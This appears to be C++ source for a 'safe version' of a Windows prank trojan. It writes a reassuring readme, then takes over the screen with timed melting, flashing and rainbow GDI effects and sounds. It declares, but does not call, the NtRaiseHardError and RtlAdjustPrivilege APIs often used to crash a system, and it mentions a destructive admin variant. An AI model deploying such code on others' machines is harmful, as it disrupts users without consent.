#include <windows.h>
#include <winreg.h>
#include <stdlib.h>
#include <mmeapi.h>
#include <iostream>
#include <fstream>
#include "SoundGDI32.h"
#include "UtilsGDI32.h"
#pragma comment(lib, "ntdll.lib")
extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
using namespace std;

int _stdcall WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	// Write a text file that gets read:
	std::ofstream message("readme.txt");
	message << "You ran the safe version so don't be scared" << std::endl;
	message << "This version does nothing to your pc" << std::endl;
	message << "" << std::endl;
	message << "If you see a version that runs as admin, it" << std::endl;
	message << "is a destructive version" << std::endl;
	message.close();
	// Read the written message(readme):
	WCHAR commandprompt[] = L"notepad.exe readme.txt";
	PROCESS_INFORMATION process = { 0 };
	STARTUPINFO startinfo = { 0 };
	CreateProcessW(NULL, commandprompt, NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT, NULL, NULL,
		&startinfo, &process);
	CloseHandle(process.hThread);
	CloseHandle(process.hProcess);
	SwapMouseButton(0);
	Sleep(2000);
	// Draw an icon on the mouse cursor:
	HANDLE icon = CreateThread(0, 0, CursorGDI, 0, 0, 0);
	// Load the 1st gdi effect(melting):
	HANDLE melteffect = CreateThread(0, 0, MeltGDI, 0, 0, 0);
	MeltSound();
	Sleep(20000);
	TerminateThread(melteffect, 0);
	CloseHandle(melteffect);
	InvalidateRect(0, 0, 0);
	// Load the 2nd gdi effect(gdihell):
	HANDLE rainbow = CreateThread(0, 0, ColorHellGDI, 0, 0, 0);
	ColorHellSound();
	Sleep(20000);
	TerminateThread(rainbow, 0);
	CloseHandle(rainbow);
	InvalidateRect(0, 0, 0);
	// Load the	3rd gdi effect(rgbhell):
	HANDLE rgb = CreateThread(0, 0, RainbowGDI, 0, 0, 0);
	RainbowSound();
	Sleep(30000);
	TerminateThread(rgb, 0);
	CloseHandle(rgb);
	InvalidateRect(0, 0, 0);
	// Load the 4th gdi effect(rainbow):
	HANDLE flash = CreateThread(0, 0, FlashGDI, 0, 0, 0);
	FlashSound();
	Sleep(15000);
	InvalidateRect(0, 0, 0);
	// Exit the trojan using user Win32:
	ExitProcess(0);
	std::cout << "Successfully exited the process" << std::endl;
}